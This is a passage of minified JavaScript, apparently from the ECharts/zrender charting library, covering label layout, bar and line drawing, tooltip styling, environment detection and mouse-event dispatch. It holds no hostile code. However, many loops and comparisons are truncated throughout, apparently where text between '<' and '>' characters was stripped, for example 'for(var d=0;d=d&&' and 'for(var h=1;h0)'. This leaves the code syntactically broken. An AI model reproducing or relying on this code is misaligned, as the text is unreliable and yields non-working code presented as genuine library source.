Math.sqrt((g-r)*(g-r)+(v-o)*(v-o))}function Mf(t,e,n,i,r,o,a){0>n&&(t+=n,n=-n),0>i&&(e+=i,i=-i);var s=t+n,l=e+i,u=a[0]=Math.min(Math.max(r,t),s),h=a[1]=Math.min(Math.max(o,e),l);return Math.sqrt((u-r)*(u-r)+(h-o)*(h-o))}function Tf(t,e,n){var i=Mf(e.x,e.y,e.width,e.height,t.x,t.y,kk);return n.set(kk[0],kk[1]),i}function Cf(t,e,n){for(var i,r,o=0,a=0,s=0,l=0,u=1/0,h=e.data,c=t.x,p=t.y,d=0;d=d&&(s=i,l=r);var S=(c-v)*_/m+v;g=wf(v,y,_,x,x+b,w,S,p,kk),o=Math.cos(x+b)*m+v,a=Math.sin(x+b)*_+y;break;case Ik.R:s=o=h[d++],l=a=h[d++];var M=h[d++],T=h[d++];g=Mf(s,l,M,T,c,p,kk);break;case Ik.Z:g=Sf(o,a,s,l,c,p,kk,!0),o=s,a=l}u>g&&(u=g,n.set(kk[0],kk[1]))}return u}function If(t,e){if(t){var n=t.getTextGuideLine(),i=t.getTextContent();if(i&&n){var r=t.textGuideLineConfig||{},o=[[0,0],[0,0],[0,0]],a=r.candidates||Dk,s=i.getBoundingRect().clone();s.applyTransform(i.getComputedTransform());var l=1/0,u=r.anchor,h=t.getComputedTransform(),c=h&&pi([],h),p=e.get(\"length2\")||0;u&&Pk.copy(u);for(var d=0;dv&&(l=v,Lk.transform(h),Pk.transform(h),Pk.toArray(o[0]),Lk.toArray(o[1]),Ak.toArray(o[2]))}Df(o,e.get(\"minTurnAngle\")),n.setShape({points:o})}}}function Df(t,e){if(180>=e&&e>0){e=e/180*Math.PI,Ak.fromArray(t[0]),Lk.fromArray(t[1]),Pk.fromArray(t[2]),vx.sub(Ok,Ak,Lk),vx.sub(Rk,Pk,Lk);var n=Ok.len(),i=Rk.len();if(!(.001>n||.001>i)){Ok.scale(1/n),Rk.scale(1/i);var r=Ok.dot(Rk),o=Math.cos(e);if(r>o){var a=Sf(Lk.x,Lk.y,Pk.x,Pk.y,Ak.x,Ak.y,Ek,!1);Nk.fromArray(Ek),Nk.scaleAndAdd(Rk,a/Math.tan(Math.PI-e));var s=Pk.x!==Lk.x?(Nk.x-Lk.x)/(Pk.x-Lk.x):(Nk.y-Lk.y)/(Pk.y-Lk.y);if(isNaN(s))return;0>s?vx.copy(Nk,Lk):s>1&&vx.copy(Nk,Pk),Nk.toArray(t[1])}}}}function kf(t,e,n){if(180>=n&&n>0){n=n/180*Math.PI,Ak.fromArray(t[0]),Lk.fromArray(t[1]),Pk.fromArray(t[2]),vx.sub(Ok,Lk,Ak),vx.sub(Rk,Pk,Lk);var i=Ok.len(),r=Rk.len();if(!(.001>i||.001>r)){Ok.scale(1/i),Rk.scale(1/r);var o=Ok.dot(e),a=Math.cos(n);if(a>o){var s=Sf(Lk.x,Lk.y,Pk.x,Pk.y,Ak.x,Ak.y,Ek,!1);Nk.fromArray(Ek);var l=Math.PI/2,u=Math.acos(Rk.dot(e)),h=l+u-n;if(h>=l)vx.copy(Nk,Pk);else{Nk.scaleAndAdd(Rk,s/Math.tan(Math.PI/2-h));var c=Pk.x!==Lk.x?(Nk.x-Lk.x)/(Pk.x-Lk.x):(Nk.y-Lk.y)/(Pk.y-Lk.y);if(isNaN(c))return;0>c?vx.copy(Nk,Lk):c>1&&vx.copy(Nk,Pk)}Nk.toArray(t[1])}}}}function Af(t,e,n,i){var r=\"normal\"===n,o=r?t:t.ensureState(n);o.ignore=e;var a=i.get(\"smooth\");a&&a===!0&&(a=.3),o.shape=o.shape||{},a>0&&(o.shape.smooth=a);var s=i.getModel(\"lineStyle\").getLineStyle();r?t.useStyle(s):o.style=s}function Lf(t,e){var n=e.smooth,i=e.points;if(i)if(t.moveTo(i[0][0],i[0][1]),n>0&&i.length>=3){var r=zm(i[0],i[1]),o=zm(i[1],i[2]);if(!r||!o)return t.lineTo(i[1][0],i[1][1]),void t.lineTo(i[2][0],i[2][1]);var a=Math.min(r,o)*n,s=ge([],i[1],i[0],a/r),l=ge([],i[1],i[2],a/o),u=ge([],s,l,.5);t.bezierCurveTo(s[0],s[1],s[0],s[1],u[0],u[1]),t.bezierCurveTo(l[0],l[1],l[0],l[1],i[2][0],i[2][1])}else for(var h=1;h0)for(var s=0;c-1>s;s++){var d=o[s]*p;l(d,0,s+1)}else for(var s=c-1;s>0;s--){var d=o[s-1]*p;l(-d,s,c)}}}function h(t){var e=0>t?-1:1;t=Math.abs(t);for(var n=Math.ceil(t/(c-1)),i=0;c-1>i;i++)if(e>0?l(n,0,i+1):l(-n,c-i-1,c),t-=n,0>=t)return}var c=t.length;if(!(2>c)){t.sort(function(t,n){return t.rect[e]-n.rect[e]});for(var p,d=0,f=!1,g=[],v=0,y=0;c>y;y++){var m=t[y],_=m.rect;p=_[e]-d,0>p&&(_[e]-=p,m.label[e]-=p,f=!0);var x=Math.max(-p,0);g.push(x),v+=x,d=_[e]+_[n]}v>0&&o&&l(-v/c,0,c);var b,w,S=t[0],M=t[c-1];return a(),0>b&&u(-b,.8),0>w&&u(w,.8),a(),s(b,w,1),s(w,b,-1),a(),0>b&&h(-b),0>w&&h(w),f}}function Nf(t,e,n,i){return Ef(t,\"x\",\"width\",e,n,i)}function zf(t,e,n,i){return Ef(t,\"y\",\"height\",e,n,i)}function Bf(t){function e(t){if(!t.ignore){var e=t.ensureState(\"emphasis\");null==e.ignore&&(e.ignore=!1)}t.ignore=!0}var n=[];t.sort(function(t,e){return e.priority-t.priority});for(var i=new Cx(0,0,0,0),r=0;r=0?\"right\":\"left\",c=Vs(i);Fs(t,c,{labelFetcher:o,labelDataIndex:n,defaultText:Jf(o.getData(),n),inheritColor:l.fill,defaultOpacity:l.opacity,defaultOutsidePosition:h});var p=t.getTextContent();if(s&&p){var d=i.get([\"label\",\"position\"]);t.textConfig.inside=\"middle\"===d?!0:null,ng(t,\"outside\"===d?h:d,hg(a),i.get([\"label\",\"rotate\"]))}qs(p,c,o.getRawValue(n),function(t){return tg(e,t)});var f=i.getModel([\"emphasis\"]);ka(t,f.get(\"focus\"),f.get(\"blurScope\"),f.get(\"disabled\")),La(t,i),ug(r)&&(t.style.fill=\"none\",t.style.stroke=\"none\",v(t.states,function(t){t.style&&(t.style.fill=t.style.stroke=\"none\")}))}function pg(t,e){var n=t.get([\"itemStyle\",\"borderColor\"]);if(!n||\"none\"===n)return 0;var i=t.get([\"itemStyle\",\"borderWidth\"])||0,r=isNaN(e.width)?Number.MAX_VALUE:Math.abs(e.width),o=isNaN(e.height)?Number.MAX_VALUE:Math.abs(e.height);return Math.min(i,r,o)}function dg(t,e,n,i){var r=t.getData(),o=r.getLayout(\"valueAxisHorizontal\")?1:0,a=r.getLayout(\"largeDataIndices\"),s=r.getLayout(\"size\"),l=t.getModel(\"backgroundStyle\"),u=r.getLayout(\"largeBackgroundPoints\");if(u){var h=new fA({shape:{points:u},incremental:!!i,silent:!0,z2:0});h.baseDimIdx=o,h.largeDataIndices=a,h.barWidth=s,h.useStyle(l.getItemStyle()),e.add(h),n&&n.push(h)}var c=new fA({shape:{points:r.getLayout(\"largePoints\")},incremental:!!i,z2:1});c.baseDimIdx=o,c.largeDataIndices=a,c.barWidth=s,e.add(c),c.useStyle(r.getVisual(\"style\")),vw(c).seriesIndex=t.seriesIndex,t.get(\"silent\")||(c.on(\"mousedown\",gA),c.on(\"mousemove\",gA)),n&&n.push(c)}function fg(t,e,n){for(var i=t.baseDimIdx,r=1-i,o=t.shape.points,a=t.largeDataIndices,s=[],l=[],u=t.barWidth,h=0,c=o.length/3;c>h;h++){var p=3*h;if(l[i]=u,l[r]=o[p+2],s[i]=o[p+i],s[r]=o[p+r],l[r]=s[0]&&e=s[1]&&n0?n=i[0]:i[1]g)break;if(Ig(y,m)){if(l){g+=o;continue}break}if(g===n)t[o>0?\"moveTo\":\"lineTo\"](y,m),c=y,p=m;else{var _=y-u,x=m-h;if(.5>_*_+x*x){g+=o;continue}if(a>0){for(var b=g+o,w=e[2*b],S=e[2*b+1];w===y&&S===m&&i>v;)v++,b+=o,g+=o,w=e[2*b],S=e[2*b+1],y=e[2*g],m=e[2*g+1],_=y-u,x=m-h;var M=v+1;if(l)for(;Ig(w,S)&&i>M;)M++,b+=o,w=e[2*b],S=e[2*b+1];var T=.5,C=0,I=0,D=void 0,k=void 0;if(M>=i||Ig(w,S))d=y,f=m;else{C=w-u,I=S-h;var A=y-u,L=w-y,P=m-h,O=S-m,R=void 0,E=void 0;if(\"x\"===s){R=Math.abs(A),E=Math.abs(L);var N=C>0?1:-1;d=y-N*R*a,f=m,D=y+N*E*a,k=m}else if(\"y\"===s){R=Math.abs(P),E=Math.abs(O);var z=I>0?1:-1;d=y,f=m-z*R*a,D=y,k=m+z*E*a}else R=Math.sqrt(A*A+P*P),E=Math.sqrt(L*L+O*O),T=E/(E+R),d=y-C*a*(1-T),f=m-I*a*(1-T),D=y+C*a*T,k=m+I*a*T,D=_A(D,xA(w,y)),k=_A(k,xA(S,m)),D=xA(D,_A(w,y)),k=xA(k,_A(S,m)),C=D-y,I=k-m,d=y-C*R/E,f=m-I*R/E,d=_A(d,xA(u,y)),f=_A(f,xA(h,m)),d=xA(d,_A(u,y)),f=xA(f,_A(h,m)),C=y-d,I=m-f,D=y+C*E/R,k=m+I*E/R}t.bezierCurveTo(c,p,d,f,y,m),c=D,p=k}else t.lineTo(y,m)}u=y,h=m,g+=o}return v}function kg(t,e){if(t.length===e.length){for(var n=0;ne){r?o.push(n(r,l,e)):i&&o.push(n(i,l,0),n(i,l,e));break}i&&(o.push(n(i,l,0)),i=null),o.push(l),r=l}}return o}function Ng(t,e,n){var i=t.getVisual(\"visualMeta\");if(i&&i.length&&t.count()&&\"cartesian2d\"===e.type){for(var r,o,a=i.length-1;a>=0;a--){var s=t.getDimensionInfo(i[a].dimension);if(r=s&&s.coordDim,\"x\"===r||\"y\"===r){o=i[a];break}}if(o){var l=e.getAxis(r),u=y(o.stops,function(t){return{coord:l.toGlobalCoord(l.dataToCoord(t.value)),color:t.color}}),h=u.length,c=o.outerColors.slice();h&&u[0].coord>u[h-1].coord&&(u.reverse(),c.reverse());var p=Eg(u,\"x\"===r?n.getWidth():n.getHeight()),d=p.length;if(!d&&h)return u[0].coord_)return\"transparent\";v(p,function(t){t.offset=(t.coord-g)/_}),p.push({offset:d?p[d-1].offset:.5,color:c[1]||\"transparent\"}),p.unshift({offset:d?p[0].offset:.5,color:c[0]||\"transparent\"});var x=new IS(0,0,0,0,p,!0);return x[r]=g,x[r+\"2\"]=m,x}}}function zg(t,e,n){var i=t.get(\"showAllSymbol\"),r=\"auto\"===i;if(!i||r){var o=n.getAxesByScale(\"ordinal\")[0];if(o&&(!r||!Bg(o,e))){var a=e.mapDimension(o.dim),s={};return v(o.getViewLabels(),function(t){var e=o.scale.getRawOrdinalNumber(t.tickValue);s[e]=1}),function(t){return!s.hasOwnProperty(e.get(a,t))}}}}function Bg(t,e){var n=t.getExtent(),i=Math.abs(n[1]-n[0])/t.scale.count();isNaN(i)&&(i=0);for(var r=e.count(),o=Math.max(1,Math.round(r/5)),a=0;r>a;a+=o)if(1.5*yA.getSymbolSize(e,a)[t.isHorizontal()?1:0]>i)return!1;return!0}function Fg(t,e){return isNaN(t)||isNaN(e)}function Vg(t){for(var e=t.length/2;e>0&&Fg(t[2*e-2],t[2*e-1]);e--);return e-1}function Hg(t,e){return[t[2*e],t[2*e+1]]}function Gg(t,e,n){for(var i,r,o=t.length/2,a=\"x\"===n?0:1,s=0,l=-1,u=0;o>u;u++)if(r=t[2*u+a],!isNaN(r)&&!isNaN(t[2*u+1-a]))if(0!==u){if(e>=i&&r>=e||i>=e&&e>=r){l=u;break}s=u,i=r}else i=r;return{range:[s,l],t:(e-i)/(r-i)}}function Wg(t){if(t.get([\"endLabel\",\"show\"]))return!0;for(var e=0;e_&&p)if(.001>=_){var S=CA/p;e.each(i,function(t,n){if(!isNaN(t)){var i=e.getItemLayout(n);i.angle=S,i.startAngle=h+w*n*S,i.endAngle=h+w*(n+1)*S}})}else f=_/x,b=h,e.each(i,function(t,n){if(!isNaN(t)){var i=e.getItemLayout(n),r=i.angle===c?c:t*f;i.startAngle=b,i.endAngle=b+w*r,b+=w*r}})})}function $g(t){return{seriesType:t,reset:function(t,e){var n=e.findComponents({mainType:\"legend\"});if(n&&n.length){var i=t.getData();i.filterSelf(function(t){for(var e=i.getName(t),r=0;ra&&(f=$p(f));var m=f*a;v=Math.ceil(u[1]/f)*f,g=Hi(v-m),0>g&&u[0]>=0?(g=0,v=Hi(m)):v>0&&u[1]i[1],l=\"start\"===e&&!s||\"start\"!==e&&s;return Zi(a-jA/2)?(o=l?\"bottom\":\"top\",r=\"center\"):Zi(a-1.5*jA)?(o=l?\"top\":\"bottom\",r=\"center\"):(o=\"middle\",r=1.5*jA>a&&a>jA/2?l?\"left\":\"right\":l?\"right\":\"left\"),{rotation:a,textAlign:r,textVerticalAlign:o}}function _v(t,e,n){if(!Bd(t.axis)){var i=t.get([\"axisLabel\",\"showMinLabel\"]),r=t.get([\"axisLabel\",\"showMaxLabel\"]);e=e||[],n=n||[];var o=e[0],a=e[1],s=e[e.length-1],l=e[e.length-2],u=n[0],h=n[1],c=n[n.length-1],p=n[n.length-2];i===!1?(xv(o),xv(u)):bv(o,a)&&(i?(xv(a),xv(h)):(xv(o),xv(u))),r===!1?(xv(s),xv(c)):bv(l,s)&&(r?(xv(l),xv(p)):(xv(s),xv(c)))}}function xv(t){t&&(t.ignore=!0)}function bv(t,e){var n=t&&t.getBoundingRect().clone(),i=e&&e.getBoundingRect().clone();if(n&&i){var r=ai([]);return hi(r,r,-t.rotation),n.applyTransform(li([],r,t.getLocalTransform())),i.applyTransform(li([],r,e.getLocalTransform())),n.intersect(i)}}function wv(t){return\"middle\"===t||\"center\"===t}function Sv(t,e,n,i,r){for(var o=[],a=[],s=[],l=0;l=d&&((a>d||p>=0&&0>s)&&(a=d,s=p,r=l,o.length=0),v(u,function(t){o.push({seriesIndex:e.seriesIndex,dataIndexInside:t,dataIndex:e.getData().getRawIndex(t)})}))}}),{payloadBatch:o,snapToValue:r}}function Dy(t,e,n,i){t[e.key]={value:n,payloadBatch:i}}function ky(t,e,n,i){var r=n.payloadBatch,o=e.axis,a=o.model,s=e.axisPointerModel;if(e.triggerTooltip&&r.length){var l=e.coordSys.model,u=zv(l),h=t.map[u];h||(h=t.map[u]={coordSysId:l.id,coordSysIndex:l.componentIndex,coordSysType:l.type,coordSysMainType:l.mainType,dataByAxis:[]},t.list.push(h)),h.dataByAxis.push({axisDim:o.dim,axisIndex:a.componentIndex,axisType:a.type,axisId:a.id,value:i,valueLabelOpt:{precision:s.get([\"label\",\"precision\"]),formatter:s.get([\"label\",\"formatter\"])},seriesDataIndices:r.slice()})}}function Ay(t,e,n){var i=n.axesInfo=[];v(e,function(e,n){var r=e.axisPointerModel.option,o=t[n];o?(!e.useHandle&&(r.status=\"show\"),r.value=o.value,r.seriesDataIndices=(o.payloadBatch||[]).slice()):!e.useHandle&&(r.status=\"hide\"),\"show\"===r.status&&i.push({axisDim:e.axis.dim,axisIndex:e.axis.model.componentIndex,value:r.value})})}function Ly(t,e,n,i){if(Ey(e)||!t.list.length)return void i({type:\"hideTip\"});var r=((t.list[0].dataByAxis[0]||{}).seriesDataIndices||[])[0]||{};i({type:\"showTip\",escapeConnect:!0,x:e[0],y:e[1],tooltipOption:n.tooltipOption,position:n.position,dataIndexInside:r.dataIndexInside,dataIndex:r.dataIndex,seriesIndex:r.seriesIndex,dataByCoordSys:t.list})}function Py(t,e,n){var i=n.getZr(),r=\"axisPointerLastHighlights\",o=LL(i)[r]||{},a=LL(i)[r]={};v(t,function(t){var e=t.axisPointerModel.option;\"show\"===e.status&&v(e.seriesDataIndices,function(t){var e=t.seriesIndex+\" | \"+t.dataIndex;a[e]=t})});var s=[],l=[];v(o,function(t,e){!a[e]&&l.push(t)}),v(a,function(t,e){!o[e]&&s.push(t)}),l.length&&n.dispatchAction({type:\"downplay\",escapeConnect:!0,notBlur:!0,batch:l}),s.length&&n.dispatchAction({type:\"highlight\",escapeConnect:!0,notBlur:!0,batch:s})}function Oy(t,e){for(var n=0;nn;n++)if(t[n]in e)return t[n]}function Fy(t,e){if(!t)return e;e=Il(e,!0);var n=t.indexOf(e);return t=-1===n?e:\"-\"+t.slice(0,n)+\"-\"+e,t.toLowerCase()}function Vy(t,e){var n=t.currentStyle||document.defaultView&&document.defaultView.getComputedStyle(t);return n?e?n[e]:n:null}function Hy(t){return t=\"left\"===t?\"right\":\"right\"===t?\"left\":\"top\"===t?\"bottom\":\"top\"}function Gy(t,e,n){if(!C(n)||\"inside\"===n)return\"\";var i=t.get(\"backgroundColor\"),r=t.get(\"borderWidth\");e=Rl(e);var o,a=Hy(n),s=Math.max(1.5*Math.round(r),6),l=\"\",u=NL+\":\";p([\"left\",\"right\"],a)>-1?(l+=\"top:50%\",u+=\"translateY(-50%) rotate(\"+(o=\"left\"===a?-225:-45)+\"deg)\"):(l+=\"left:50%\",u+=\"translateX(-50%) rotate(\"+(o=\"top\"===a?225:45)+\"deg)\");var h=o*Math.PI/180,c=s+r,d=c*Math.abs(Math.cos(h))+c*Math.abs(Math.sin(h)),f=Math.round(100*((d-Math.SQRT2*r)/2+Math.SQRT2*r-(d-c)/2))/100;l+=\";\"+a+\":-\"+f+\"px\";var g=e+\" solid \"+r+\"px;\",v=[\"position:absolute;width:\"+s+\"px;height:\"+s+\"px;\",l+\";\"+u+\";\",\"border-bottom:\"+g,\"border-right:\"+g,\"background-color:\"+i+\";\"];return''}function Wy(t,e){var n=\"cubic-bezier(0.23,1,0.32,1)\",i=\" \"+t/2+\"s \"+n,r=\"opacity\"+i+\",visibility\"+i;return e||(i=\" \"+t+\"s \"+n,r+=lm.transformSupported?\",\"+NL+i:\",left\"+i+\",top\"+i),EL+\":\"+r}function Uy(t,e,n){var i=t.toFixed(0)+\"px\",r=e.toFixed(0)+\"px\";if(!lm.transformSupported)return n?\"top:\"+r+\";left:\"+i+\";\":[[\"top\",r],[\"left\",i]];var o=lm.transform3dSupported,a=\"translate\"+(o?\"3d\":\"\")+\"(\"+i+\",\"+r+(o?\",0\":\"\")+\")\";return n?\"top:0;left:0;\"+NL+\":\"+a+\";\":[[\"top\",0],[\"left\",0],[OL,a]]}function Xy(t){var e=[],n=t.get(\"fontSize\"),i=t.getTextColor();i&&e.push(\"color:\"+i),e.push(\"font:\"+t.getFont()),n&&e.push(\"line-height:\"+Math.round(3*n/2)+\"px\");var r=t.get(\"textShadowColor\"),o=t.get(\"textShadowBlur\")||0,a=t.get(\"textShadowOffsetX\")||0,s=t.get(\"textShadowOffsetY\")||0;return r&&o&&e.push(\"text-shadow:\"+a+\"px \"+s+\"px \"+o+\"px \"+r),v([\"decoration\",\"align\"],function(n){var i=t.get(n);i&&e.push(\"text-\"+n+\":\"+i)}),e.join(\";\")}function Yy(t,e,n){var i=[],r=t.get(\"transitionDuration\"),o=t.get(\"backgroundColor\"),a=t.get(\"shadowBlur\"),s=t.get(\"shadowColor\"),l=t.get(\"shadowOffsetX\"),u=t.get(\"shadowOffsetY\"),h=t.getModel(\"textStyle\"),c=Mh(t,\"html\"),p=l+\"px \"+u+\"px \"+a+\"px \"+s;return i.push(\"box-shadow:\"+p),e&&r&&i.push(Wy(r,n)),o&&i.push(\"background-color:\"+o),v([\"width\",\"color\",\"radius\"],function(e){var n=\"border-\"+e,r=Il(n),o=t.get(r);null!=o&&i.push(n+\":\"+o+(\"color\"===e?\"\":\"px\"))}),i.push(Xy(h)),null!=c&&i.push(\"padding:\"+TM(c).join(\"px \")+\"px\"),i.join(\";\")+\";\"}function qy(t,e,n,i,r){var o=e&&e.painter;if(n){var a=o&&o.getViewportRoot();a&&be(t,a,document.body,i,r)}else{t[0]=i,t[1]=r;var s=o&&o.getViewportRootOffset();s&&(t[0]+=s.offsetLeft,t[1]+=s.offsetTop)}t[2]=t[0]/e.getWidth(),t[3]=t[1]/e.getHeight()}function jy(t){return Math.max(0,t)}function Zy(t){var e=jy(t.shadowBlur||0),n=jy(t.shadowOffsetX||0),i=jy(t.shadowOffsetY||0);return{left:jy(e-n),right:jy(e+n),top:jy(e-i),bottom:jy(e+i)}}function Ky(t,e,n,i){t[0]=n,t[1]=i,t[2]=t[0]/e.getWidth(),t[3]=t[1]/e.getHeight()}function $y(t,e,n){var i,r=e.ecModel;n?(i=new oM(n,r,r),i=new oM(e.option,i,r)):i=e;for(var o=t.length-1;o>=0;o--){var a=t[o];a&&(a instanceof oM&&(a=a.get(\"tooltip\",!0)),C(a)&&(a={formatter:a}),a&&(i=new oM(a,i,r)))}return i}function Qy(t,e){return t.dispatchAction||Am(e.dispatchAction,e)}function Jy(t,e,n,i,r,o,a){var s=n.getSize(),l=s[0],u=s[1];return null!=o&&(t+l+o+2>i?t-=l+o:t+=o),null!=a&&(e+u+a>r?e-=u+a:e+=a),[t,e]}function tm(t,e,n,i,r){var o=n.getSize(),a=o[0],s=o[1];return t=Math.min(t+a,i)-a,e=Math.min(e+s,r)-s,t=Math.max(t,0),e=Math.max(e,0),[t,e]}function em(t,e,n,i){var r=n[0],o=n[1],a=Math.ceil(Math.SQRT2*i)+8,s=0,l=0,u=e.width,h=e.height;switch(t){case\"inside\":s=e.x+u/2-r/2,l=e.y+h/2-o/2;break;case\"top\":s=e.x+u/2-r/2,l=e.y-o-a;break;case\"bottom\":s=e.x+u/2-r/2,l=e.y+h+a;break;case\"left\":s=e.x-r-a,l=e.y+h/2-o/2;break;case\"right\":s=e.x+u+a,l=e.y+h/2-o/2}return[s,l]}function nm(t){return\"center\"===t||\"middle\"===t}function im(t,e,n){var i=Ar(t).queryOptionMap,r=i.keys()[0];if(r&&\"series\"!==r){var o=Lr(e,r,i.get(r),{useDefault:!1,enableAll:!1,enableNone:!1}),a=o.models[0];if(a){var s,l=n.getViewOfComponentModel(a);return l.group.traverse(function(e){var n=vw(e).tooltipConfig;return n&&n.name===t.name?(s=e,!0):void 0}),s?{componentMainType:r,componentIndex:a.componentIndex,el:s}:void 0}}}function rm(t){Ud(Ny),t.registerComponentModel(PL),t.registerComponentView(HL),t.registerAction({type:\"showTip\",event:\"showTip\",update:\"tooltip:manuallyShowTip\"},$),t.registerAction({type:\"hideTip\",event:\"hideTip\",update:\"tooltip:manuallyHideTip\"},$)}var om=function(t,e){return(om=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)Object.prototype.hasOwnProperty.call(e,n)&&(t[n]=e[n])})(t,e)},am=function(){function t(){this.firefox=!1,this.ie=!1,this.edge=!1,this.newEdge=!1,this.weChat=!1}return t}(),sm=function(){function t(){this.browser=new am,this.node=!1,this.wxa=!1,this.worker=!1,this.svgSupported=!1,this.touchEventsSupported=!1,this.pointerEventsSupported=!1,this.domSupported=!1,this.transformSupported=!1,this.transform3dSupported=!1,this.hasGlobalWindow=\"undefined\"!=typeof window}return t}(),lm=new sm;\"object\"==typeof wx&&\"function\"==typeof wx.getSystemInfoSync?(lm.wxa=!0,lm.touchEventsSupported=!0):\"undefined\"==typeof document&&\"undefined\"!=typeof self?lm.worker=!0:\"undefined\"==typeof navigator?(lm.node=!0,lm.svgSupported=!0):n(navigator.userAgent,lm);var um=12,hm=\"sans-serif\",cm=um+\"px \"+hm,pm=20,dm=100,fm=\"007LLmW'55;N0500LLLLLLLLLL00NNNLzWW\\\\\\\\WQb\\\\0FWLg\\\\bWb\\\\WQ\\\\WrWWQ000CL5LLFLL0LL**F*gLLLL5F0LF\\\\FFF5.5N\",gm=i(fm),vm={createCanvas:function(){return\"undefined\"!=typeof document&&document.createElement(\"canvas\")},measureText:function(){var t,e;return function(n,i){if(!t){var r=vm.createCanvas();t=r&&r.getContext(\"2d\")}if(t)return e!==i&&(e=t.font=i||cm),t.measureText(n);n=n||\"\",i=i||cm;var o=/^([0-9]*?)px$/.exec(i),a=+(o&&o[1])||um,s=0;if(i.indexOf(\"mono\")>=0)s=a*n.length;else for(var l=0;l1&&i&&i.length>1){var o=Oe(i)/Oe(r);!isFinite(o)&&(o=1),e.pinchScale=o;var a=Re(i);return e.pinchX=a[0],e.pinchY=a[1],{type:\"pinch\",target:t[0].target,event:e}}}}},Qm=\"silent\",Jm=function(t){function n(){var e=null!==t&&t.apply(this,arguments)||this;return e.handler=null,e}return e(n,t),n.prototype.dispose=function(){},n.prototype.setCursor=function(){},n}(Gm),t_=function(){function t(t,e){this.x=t,this.y=e}return t}(),e_=[\"click\",\"dblclick\",\"mousewheel\",\"mouseout\",\"mouseup\",\"mousedown\",\"mousemove\",\"contextmenu\"],n_=function(t){function n(e,n,i,r){var o=t.call(this)||this;return o._hovered=new t_(0,0),o.storage=e,o.painter=n,o.painterRoot=r,i=i||new Jm,o.proxy=null,o.setHandlerProxy(i),o._draggingMgr=new Hm(o),o}return e(n,t),n.prototype.setHandlerProxy=function(t){this.proxy&&this.proxy.dispose(),t&&(v(e_,function(e){t.on&&t.on(e,this[e],this)},this),t.handler=this),this.proxy=t},n.prototype.mousemove=function(t){var e=t.zrX,n=t.zrY,i=Be(this,e,n),r=this._hovered,o=r.target;o&&!o.__zr&&(r=this.findHover(r.x,r.y),o=r.target);var a=this._hovered=i?new t_(e,n):this.findHover(e,n),s=a.target,l=this.proxy;l.setCursor&&l.setCursor(s?s.cursor:\"default\"),o&&s!==o&&this.dispatchToElement(r,\"mouseout\",t),this.dispatchToElement(a,\"mousemove\",t),s&&s!==o&&this.dispatchToElement(a,\"mouseover\",t)},n.prototype.mouseout=function(t){var e=t.zrEventControl;\"only_globalout\"!==e&&this.dispatchToElement(this._hovered,\"mouseout\",t),\"no_globalout\"!==e&&this.trigger(\"globalout\",{type:\"globalout\",event:t})},n.prototype.resize=function(){this._hovered=new t_(0,0)},n.prototype.dispatch=function(t,e){var n=this[t];n&&n.call(this,e)},n.prototype.dispose=function(){this.proxy.dispose(),this.storage=null,this.proxy=null,this.painter=null},n.prototype.setCursorStyle=function(t){var e=this.proxy;e.setCursor&&e.setCursor(t)},n.prototype.dispatchToElement=function(t,e,n){t=t||{};var i=t.target;if(!i||!i.silent){for(var r=\"on\"+e,o=Ee(e,t,n);i&&(i[r]&&(o.cancelBubble=!!i[r].call(i,o)),i.trigger(e,o),i=i.__hostTarget?i.__hostTarget:i.parent,!o.cancelBubble););o.cancelBubble||(this.trigger(e,o),this.painter&&this.painter.eachOtherLayer&&this.painter.eachOtherLayer(function(t){\"function\"==typeof t[r]&&t[r].call(t,o),t.trigger&&t.trigger(e,o)}))}},n.prototype.findHover=function(t,e,n){for(var i=this.storage.getDisplayList(),r=new t_(t,e),o=i.length-1;o>=0;o--){var a=void 0;if(i[o]!==n&&!i[o].ignore&&(a=ze(i[o],t,e))&&(!r.topTarget&&(r.topTarget=i[o]),a!==Qm)){r.target=i[o];break}}return r},n.prototype.processGesture=function(t,e){this._gestureMgr||(this._gestureMgr=new Km);var n=this._gestureMgr;\"start\"===e&&n.clear();var i=n.recognize(t,this.findHover(t.zrX,t.zrY,null).target,this.proxy.dom);if(\"end\"===e&&n.clear(),i){var r=i.type;t.gestureEvent=r;var o=new t_;o.target=i.target,this.dispatchToElement(o,r,i.event)}},n}(Gm);v([\"click\",\"mousedown\",\"mouseup\",\"mousewheel\",\"dblclick\",\"contextmenu\"],function(t){n_.prototype[t]=function(e){var n,i,r=e.zrX,o=e.zrY,a=Be(this,r,o);if(\"mouseup\"===t&&a||(n=this.findHover(r,o),i=n.target),\"mousedown\"===t)this._downEl=i,this._downPoint=[e.zrX,e.zrY],this._upEl=i;else if(\"mouseup\"===t)this._upEl=i;else if(\"click\"===t){if(this._downEl!==this._upEl||!this._downPoint||zm(this._downPoint,[e.zrX,e.zrY])>4)return;this._downPoint=null}this.dispatchToElement(n,t,e)}});var i_,r_=32,o_=7,a_=1,s_=2,l_=4,u_=!1,h_=function(){function t(){this._roots=[],this._displayList=[],this._displayListLen=0,this.displayableSortFunc=je}return t.prototype.traverse=function(t,e){for(var n=0;ni;i++)this._updateAndAddDisplayable(e[i],null,t);n.length=this._displayListLen,Ye(n,je)},t.prototype._updateAndAddDisplayable=function(t,e,n){if(!t.ignore||n){t.beforeUpdate(),t.update(),t.afterUpdate();var i=t.getClipPath();if(t.ignoreClip)e=null;else if(i){e=e?e.slice():[];for(var r=i,o=t;r;)r.parent=o,r.updateTransform(),e.push(r),o=r,r=r.getClipPath()}if(t.childrenRef){for(var a=t.childrenRef(),s=0;s0&&(u.__clipPaths=[]),isNaN(u.z)&&(qe(),u.z=0),isNaN(u.z2)&&(qe(),u.z2=0),isNaN(u.zlevel)&&(qe(),u.zlevel=0),this._displayList[this._displayListLen++]=u}var h=t.getDecalElement&&t.getDecalElement();h&&this._updateAndAddDisplayable(h,e,n);var c=t.getTextGuideLine();c&&this._updateAndAddDisplayable(c,e,n);var p=t.getTextContent();p&&this._updateAndAddDisplayable(p,e,n)}},t.prototype.addRoot=function(t){t.__zr&&t.__zr.storage===this||this._roots.push(t)},t.prototype.delRoot=function(t){if(t instanceof Array)for(var e=0,n=t.length;n>e;e++)this.delRoot(t[e]);else{var i=p(this._roots,t);i>=0&&this._roots.splice(i,1)}},t.prototype.delAllRoots=function(){this._roots=[],this._displayList=[],this._displayListLen=0},t.prototype.getRoots=function(){return this._roots},t.prototype.dispose=function(){this._displayList=null,this._roots=null},t}();i_=lm.hasGlobalWindow&&(window.requestAnimationFrame&&window.requestAnimationFrame.bind(window)||window.msRequestAnimationFrame&&window.msRequestAnimationFrame.bind(window)||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame)||function(t){return 